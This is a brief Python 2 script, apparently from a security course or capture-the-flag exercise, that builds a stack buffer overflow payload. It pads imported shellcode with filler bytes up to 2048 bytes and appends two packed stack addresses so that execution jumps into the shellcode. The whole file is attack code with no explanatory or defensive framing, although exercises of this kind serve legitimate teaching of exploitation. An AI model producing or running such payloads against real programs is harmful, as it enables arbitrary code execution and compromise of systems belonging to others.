from struct import pack
from shellcode import shellcode

addr_of_retadd = 0xbffea0ec
shellcode_addr = 0xbffe98d8
s = shellcode + "A" * (2048 - len(shellcode))

print s + str(pack("<I", shellcode_addr)) + str(pack("<I", addr_of_retadd))